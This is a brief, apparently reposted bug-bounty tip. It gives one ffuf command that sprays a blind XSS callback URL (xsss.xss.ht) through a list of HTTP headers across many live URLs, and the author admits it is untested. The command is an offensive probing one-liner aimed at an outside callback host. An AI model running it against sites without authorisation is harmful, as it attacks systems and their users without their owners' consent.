This for test not sure if it working or not.

Save headers.txt on your root dir and change the blind xss to yours.

Run ffuf -w urls_live.txt:FUZZ1 -w headers.txt:FUZZ2 -u FUZZ1 -H "FUZZ2:https://xsss.xss.ht"

Original tweet

https://twitter.com/sil3ntknight46/status/1478206857848115207?s=20
